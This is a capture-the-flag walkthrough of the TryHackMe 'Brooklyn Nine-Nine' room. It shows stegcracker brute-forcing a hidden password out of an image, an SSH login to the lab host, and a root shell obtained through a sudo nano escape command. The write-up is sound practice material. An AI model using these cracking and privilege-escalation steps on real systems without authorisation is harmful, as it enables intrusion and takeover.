**Brooklyn Nine-Nine** is a **easy** rated room on **TryHackMe**, inspired by the *Brooklyn Nine-Nine* TV series. The challenge starts with a web server hosting a precinct's internal site containing employee profiles and clues. By enumerating the server, hidden files and directories are uncovered, leading to sensitive information. Initial access is gained through weak credentials, and exploiting further vulnerabilities allows privilege escalation.



For any webpage, the first thing that we can do is check out itâ€™s source-code and over there we can see a hint related to `steganography`

Now, we can think like we have an image and a hint towards steganography. So, we can download the image and see if there is something hidden inside it. We can use `Steghide` to uncover the hidden data:


```console
Glitch.@glitch.:~/Downloads$ steghide extract -sf brooklyn99.jpg 
Enter passphrase: 
steghide: can not uncompress data. compressed data is corrupted.
```
Steghide was not able to retrieve the data from the image, so we can try to do the same with `StegCracker`. If StegCracker is not present on your machine, it can be downloaded using the command 

```bash
sudo apt install stegcracker
```

We can pass on a wordlist to StegCracker which it uses to attack the target file and if the wordlist is not passed on then it by default uses the rockyou.txt to attack the target file.

We can pass on a wordlist to StegCracker which it uses to attack the target file and if the wordlist is not passed on then it by default uses the rockyou.txt to attack the target file.

```console
Glitch.@glitch.:~/Downloads$ stegcracker brooklyn99.jpg

We can see that the file has been cracked and the data has been written to a new file.
```console 
Glitch.@glitch.:~/Downloads$ cat brooklyn99.jpg.out 
Holts Password:
*******************
Enjoy!!
```
Now, we have the user credentials that we can try to use with SSH. Keep in mind that the username is `holt` and I've hid the password with `*`.

```console
Glitch@glitch:~$ ssh holt@10.10.182.115
The authenticity of host '10.10.182.115 (10.10.182.115)' can't be established.

holt@10.10.182.115's password: 
Last login: Tue May 26 08:59:00 2020 from 10.10.10.18
holt@brookly_nine_nine:~$ cat user.txt 
*******************************
```

And we got the `user.txt` flag. Now, the next task is to get the root access for which we need to perform privilege escalation.

# Privilege Escalation
As we have already logged in as holt, we need to become root to get the second flag. We can check the commands that can be executed as user holt. To do this we can use the command `sudo -l` to list all the commands that we can execute as root.


```console
Glitch.@brookly_nine_nine:~$ sudo -l
Matching Defaults entries for holt on brookly_nine_nine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User holt may run the following commands on brookly_nine_nine:
    (ALL) NOPASSWD: /bin/nano
```

We can see that the command `/bin/nano` can be executed as 'root' by user 'holt'. So, we can check if there are any GTFOBins for `nano`. We can run the commands as described in GTFOBins and get the shell access as root.

First, we need to enter the `nano editor` with sudo privilege using the command:

```console 
holt@brookly_nine_nine:~$ sudo /bin/nano
```

Once, we get into the editor we need to press Ctrl+R and then Ctrl+X and then we can execute the command `reset; sh 1>&0 2>&0`. This will give us a root shell using which we can read the `root.txt` from `/root` directory.

Now we can take the flag from `root.txt` and submit it as the flag for the second question. With this, we have solved the `Brooklyn Nine-Nine` room!
